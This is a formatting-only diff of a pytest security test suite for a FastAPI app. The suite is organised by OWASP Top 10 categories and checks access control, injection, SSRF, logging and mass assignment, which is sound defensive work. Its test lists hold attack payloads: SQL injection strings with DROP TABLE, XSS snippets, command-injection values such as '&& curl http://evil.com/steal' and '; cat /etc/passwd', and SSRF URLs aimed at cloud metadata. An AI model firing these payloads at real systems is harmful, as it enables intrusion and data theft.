@@ -16,8 +16,8 @@ Date: 2025-12-27
 """
 
 import pytest
-from httpx import AsyncClient, ASGITransport
 from fastapi import FastAPI
+from httpx import ASGITransport, AsyncClient
 from sqlalchemy.ext.asyncio import AsyncSession
 
 # Import the app for testing
@@ -41,21 +41,21 @@ class TestA01_BrokenAccessControl:
         IDOR Test: User should not be able to enumerate other users by ID
         """
         response = await client.get(
-            "/api/v1/users/99999",  # Non-existent user ID
-            headers=auth_headers_user
+            "/api/v1/users/99999", headers=auth_headers_user  # Non-existent user ID
         )
 
         # Should return 404, not 403 (to prevent enumeration)
         assert response.status_code in [404, 403]
 
     @pytest.mark.asyncio
-    async def test_idor_assessment_access(self, client: AsyncClient, auth_headers_user, test_assessment_id):
+    async def test_idor_assessment_access(
+        self, client: AsyncClient, auth_headers_user, test_assessment_id
+    ):
         """
         IDOR Test: User should not access other users' assessments
         """
         response = await client.get(
-            f"/api/v1/assessments/{test_assessment_id}",
-            headers=auth_headers_user
+            f"/api/v1/assessments/{test_assessment_id}", headers=auth_headers_user
         )
 
         # If assessment exists and user doesn't own it, should be 403
@@ -65,19 +65,19 @@ class TestA01_BrokenAccessControl:
             assert data.get("created_by_id") == int(auth_headers_user["user_id"])
 
     @pytest.mark.asyncio
-    async def test_privilege_escalation_role_manipulation(self, client: AsyncClient, auth_headers_user):
+    async def test_privilege_escalation_role_manipulation(
+        self, client: AsyncClient, auth_headers_user
+    ):
         """
         Test: Users cannot escalate privileges by manipulating role field
         """
         update_data = {
             "role": "admin",  # Try to escalate to admin
-            "full_name": "Test User"
+            "full_name": "Test User",
         }
 
         response = await client.put(
-            "/api/v1/users/me",
-            json=update_data,
-            headers=auth_headers_user
+            "/api/v1/users/me", json=update_data, headers=auth_headers_user
         )
 
         # Should reject role update
@@ -88,7 +88,9 @@ class TestA01_BrokenAccessControl:
         assert response.json()["role"] != "admin"
 
     @pytest.mark.asyncio
-    async def test_bypass_authorization_with_missing_dependency(self, client: AsyncClient):
+    async def test_bypass_authorization_with_missing_dependency(
+        self, client: AsyncClient
+    ):
         """
         Test: Cannot access protected endpoints without auth
         """
@@ -96,22 +98,26 @@ class TestA01_BrokenAccessControl:
             "/api/v1/users/me",
             "/api/v1/users/",
             "/api/v1/assessments/",
-            "/api/v1/ai/secure/chat"
+            "/api/v1/ai/secure/chat",
         ]
 
         for endpoint in endpoints:
             response = await client.get(endpoint)
-            assert response.status_code == 401, f"Endpoint {endpoint} should require auth"
+            assert (
+                response.status_code == 401
+            ), f"Endpoint {endpoint} should require auth"
 
     @pytest.mark.asyncio
-    async def test_horizontal_access_control_users(self, client: AsyncClient, auth_headers_admin):
+    async def test_horizontal_access_control_users(
+        self, client: AsyncClient, auth_headers_admin
+    ):
         """
         Test: Admin cannot perform actions on other users without proper authorization
         """
         # This tests that even admins have proper access controls
         response = await client.get(
             "/api/v1/users/?created_by=1",  # Try to filter by another user
-            headers=auth_headers_admin
+            headers=auth_headers_admin,
         )
 
         # Should only return users the admin has access to
@@ -135,16 +141,12 @@ class TestA03_Injection:
             "admin' OR '1'='1",
             "admin'; DROP TABLE users; --",
             "' OR '1'='1' --",
-            "1' UNION SELECT * FROM users--"
+            "1' UNION SELECT * FROM users--",
         ]
 
         for payload in sqli_payloads:
             response = await client.post(
-                "/api/v1/auth/token",
-                data={
-                    "username": payload,
-                    "password": "test"
-                }
+                "/api/v1/auth/token", data={"username": payload, "password": "test"}
             )
 
             # Should return 401, not 500
@@ -163,7 +165,7 @@ class TestA03_Injection:
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "javascript:alert('XSS')",
-            "<svg onload=alert('XSS')>"
+            "<svg onload=alert('XSS')>",
         ]
 
         for payload in xss_payloads:
@@ -171,7 +173,7 @@ class TestA03_Injection:
             response = await client.put(
                 "/api/v1/users/me",
                 json={"full_name": payload},
-                headers=auth_headers_user
+                headers=auth_headers_user,
             )
 
             if response.status_code == 200:
@@ -190,13 +192,12 @@ class TestA03_Injection:
         sqli_payloads = [
             "test' OR '1'='1",
             "test' UNION SELECT * FROM users--",
-            "test'; DROP TABLE assessments; --"
+            "test'; DROP TABLE assessments; --",
         ]
 
         for payload in sqli_payloads:
             response = await client.get(
-                f"/api/v1/users/?search={payload}",
-                headers=auth_headers_admin
+                f"/api/v1/users/?search={payload}", headers=auth_headers_admin
             )
 
             # Should return 400 (validation) or 200 (empty results), not 500
@@ -212,15 +213,14 @@ class TestA03_Injection:
             "test.txt; cat /etc/passwd",
             "test.txt | whoami",
             "test.txt && curl http://evil.com/steal",
-            "test.txt`id`"
+            "test.txt`id`",
         ]
 
         for payload in command_payloads:
             # This would typically be in file upload endpoints
             # For now, test in search functionality
             response = await client.get(
-                f"/api/v1/assessments/?search={payload}",
-                headers=auth_headers_user
+                f"/api/v1/assessments/?search={payload}", headers=auth_headers_user
             )
 
             # Should handle safely
@@ -231,20 +231,11 @@ class TestA03_Injection:
         """
         LDAP Injection Test: Attempt LDAP injection (if LDAP is used)
         """
-        ldap_payloads = [
-            "*)(uid=*",
-            "*))(|(uid=*",
-            "*)(password=*",
-            "admin*"
-        ]
+        ldap_payloads = ["*)(uid=*", "*))(|(uid=*", "*)(password=*", "admin*"]
 
         for payload in ldap_payloads:
             response = await client.post(
-                "/api/v1/auth/token",
-                data={
-                    "username": payload,
-                    "password": "test"
-                }
+                "/api/v1/auth/token", data={"username": payload, "password": "test"}
             )
 
             # Should handle safely
@@ -333,13 +324,7 @@ class TestA07_AuthenticationFailures:
         """
         Test: Weak passwords should be rejected
         """
-        weak_passwords = [
-            "password",
-            "123456",
-            "qwerty",
-            "abc123",
-            "test"
-        ]
+        weak_passwords = ["password", "123456", "qwerty", "abc123", "test"]
 
         for password in weak_passwords:
             response = await client.post(
@@ -347,13 +332,16 @@ class TestA07_AuthenticationFailures:
                 json={
                     "email": f"test{password}@example.com",
                     "password": password,
-                    "full_name": "Test User"
-                }
+                    "full_name": "Test User",
+                },
             )
 
             # Should reject weak password
             assert response.status_code == 400
-            assert "password" in response.text.lower() or "strength" in response.text.lower()
+            assert (
+                "password" in response.text.lower()
+                or "strength" in response.text.lower()
+            )
 
     @pytest.mark.asyncio
     async def test_password_not_logged(self, client: AsyncClient, monkeypatch):
@@ -364,7 +352,7 @@ class TestA07_AuthenticationFailures:
         # For now, just verify passwords aren't in responses
         response = await client.post(
             "/api/v1/auth/token",
-            data={"username": "test", "password": "MySecretPassword123!"}
+            data={"username": "test", "password": "MySecretPassword123!"},
         )
 
         # Password should not be in response
@@ -409,7 +397,7 @@ class TestA09_SecurityLogging:
         with caplog.at_level(logging.INFO):
             response = await client.post(
                 "/api/v1/auth/token",
-                data={"username": "test@example.com", "password": "wrongpassword"}
+                data={"username": "test@example.com", "password": "wrongpassword"},
             )
 
         # Should have logged the failed attempt
@@ -426,12 +414,16 @@ class TestA09_SecurityLogging:
             response = await client.get("/api/v1/users/")
 
         # Should have logged unauthorized access
-        assert any("unauthorized" in record.message.lower() or
-                  "forbidden" in record.message.lower()
-                  for record in caplog.records)
+        assert any(
+            "unauthorized" in record.message.lower()
+            or "forbidden" in record.message.lower()
+            for record in caplog.records
+        )
 
     @pytest.mark.asyncio
-    async def test_sensitive_actions_logged(self, client: AsyncClient, auth_headers_user, caplog):
+    async def test_sensitive_actions_logged(
+        self, client: AsyncClient, auth_headers_user, caplog
+    ):
         """
         Test: Sensitive actions (password change, deletion) should be logged
         """
@@ -440,16 +432,12 @@ class TestA09_SecurityLogging:
         with caplog.at_level(logging.INFO):
             response = await client.post(
                 "/api/v1/users/change-password",
-                json={
-                    "current_password": "oldpass",
-                    "new_password": "NewPass123!"
-                },
-                headers=auth_headers_user
+                json={"current_password": "oldpass", "new_password": "NewPass123!"},
+                headers=auth_headers_user,
             )
 
         # Should log password change attempt (success or failure)
-        assert any("password" in record.message.lower()
-                  for record in caplog.records)
+        assert any("password" in record.message.lower() for record in caplog.records)
 
 
 class TestA10_SSRF:
@@ -469,7 +457,7 @@ class TestA10_SSRF:
             "http://127.0.0.1:6379",
             "http://169.254.169.254/latest/meta-data/",  # AWS metadata
             "http://[::1]/admin",
-            "file:///etc/passwd"
+            "file:///etc/passwd",
         ]
 
         for url in internal_urls:
@@ -477,11 +465,8 @@ class TestA10_SSRF:
             # For now, test that URLs are validated
             response = await client.post(
                 "/api/v1/assessments/1/assignments",
-                json={
-                    "callback_url": url,
-                    "user_id": 1
-                },
-                headers=auth_headers_user
+                json={"callback_url": url, "user_id": 1},
+                headers=auth_headers_user,
             )
 
             # Should reject internal URLs
@@ -503,7 +488,7 @@ class TestA10_SSRF:
             response = await client.post(
                 "/api/v1/webhooks/register",
                 json={"url": url},
-                headers=auth_headers_user
+                headers=auth_headers_user,
             )
 
             # Should reject suspicious URLs
@@ -524,8 +509,7 @@ class TestAdditionalSecurity:
         responses = []
         for _ in range(10):
             response = await client.post(
-                "/api/v1/auth/token",
-                data={"username": "test", "password": "wrong"}
+                "/api/v1/auth/token", data={"username": "test", "password": "wrong"}
             )
             responses.append(response)
 
@@ -539,10 +523,7 @@ class TestAdditionalSecurity:
         Test: CSRF protection should be in place
         """
         # Try state-changing operation without CSRF token
-        response = await client.post(
-            "/api/v1/users/me",
-            json={"full_name": "Hacked"}
-        )
+        response = await client.post("/api/v1/users/me", json={"full_name": "Hacked"})
 
         # Should require auth (which includes CSRF protection)
         assert response.status_code == 401
@@ -557,7 +538,9 @@ class TestAdditionalSecurity:
         assert response.status_code == 405  # Method Not Allowed
 
     @pytest.mark.asyncio
-    async def test_mass_assignment_prevented(self, client: AsyncClient, auth_headers_user):
+    async def test_mass_assignment_prevented(
+        self, client: AsyncClient, auth_headers_user
+    ):
         """
         Test: Mass assignment vulnerabilities should be prevented
         """
@@ -568,9 +551,9 @@ class TestAdditionalSecurity:
                 "id": 999,  # Try to change ID
                 "role": "admin",  # Try to escalate
                 "is_verified": True,  # Try to bypass verification
-                "password_hash": "hacked"  # Try to set hash directly
+                "password_hash": "hacked",  # Try to set hash directly
             },
-            headers=auth_headers_user
+            headers=auth_headers_user,
         )
 
         # Should reject or sanitize
@@ -581,6 +564,7 @@ class TestAdditionalSecurity:
 
 
 # ==================== Fixtures ====================
+
 
 @pytest.fixture
 async def client(app: FastAPI):
@@ -595,10 +579,7 @@ async def auth_headers_user(client: AsyncClient):
     """Get auth headers for regular user"""
     response = await client.post(
         "/api/v1/auth/token",
-        data={
-            "username": "user@example.com",
-            "password": "UserPass123!"
-        }
+        data={"username": "user@example.com", "password": "UserPass123!"},
     )
 
     if response.status_code == 200:
@@ -613,10 +594,7 @@ async def auth_headers_admin(client: AsyncClient):
     """Get auth headers for admin user"""
     response = await client.post(
         "/api/v1/auth/token",
-        data={
-            "username": "admin@example.com",
-            "password": "AdminPass123!"
-        }
+        data={"username": "admin@example.com", "password": "AdminPass123!"},
     )
 
     if response.status_code == 200:
